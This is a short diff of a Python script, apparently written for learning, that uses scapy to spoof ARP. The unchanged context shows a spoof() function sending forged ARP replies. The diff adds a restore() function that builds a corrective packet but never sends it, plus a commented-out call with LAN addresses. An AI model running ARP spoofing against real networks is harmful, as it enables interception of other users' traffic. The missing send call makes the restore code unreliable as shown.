@@ -16,6 +16,12 @@ def spoof(target_ip, spoof_ip, get_mac_address):
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
+def restore(destination_ip, source_ip, get_mac_address):
+    target_mac = get_mac_address(destination_ip)
+    source_mac = get_mac_address(source_ip)
+    packet = ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+# restore("192.168.63.174", "192.168.63.2", get_mac)
+
 sent_packets_count = 0
 try:
     while True:
